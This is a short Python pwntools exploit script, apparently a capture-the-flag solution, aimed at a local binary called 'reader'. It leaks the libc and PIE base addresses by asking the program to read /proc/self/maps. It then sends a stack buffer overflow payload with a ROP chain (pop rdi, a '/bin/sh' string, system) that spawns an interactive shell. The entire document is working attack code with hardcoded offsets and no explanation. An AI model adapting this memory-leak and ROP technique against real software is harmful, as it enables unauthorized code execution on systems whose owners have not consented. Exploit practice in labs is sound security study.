from pwn import *
p = process("reader")

def leak_base(name_substr: bytes, perm: bytes):
    p.sendlineafter(b": ", b"/proc/self/maps")
    maps = p.recvuntil(b"[stack]")

    lines = maps.split(b"\n")
    cand = [l for l in lines if name_substr in l and perm in l]
    if not cand:
        base = os.path.basename(name_substr.decode()).encode()
        cand = [l for l in lines if base in l and perm in l]

    if not cand:
        log.failure(f"Could not find mapping for {name_substr!r}")
        log.info(maps.decode())
        exit(1)

    return int(cand[0].split(b"-")[0], 16)

libcBase = leak_base(b"libc.so", b'r--')
log.info(f"libcBase: {hex(libcBase)}")

pieBase = leak_base(b"reader", b'r-x')
log.info(f"pieBase: {hex(pieBase)}")

payload  = b"flag" + (b"A" * (120-4))
print(payload)
payload += p64(0x1fc + pieBase)   	# if flag in filename it returns
payload += p64(0x2a145 + libcBase)      # pop rdi ; ret
payload += p64(0x1a7ea4 + libcBase)     # rdi = /bin/sh
payload += p64(0x53110 + libcBase)      # system("/bin/sh")

p.sendlineafter(b": ", payload)
p.interactive()
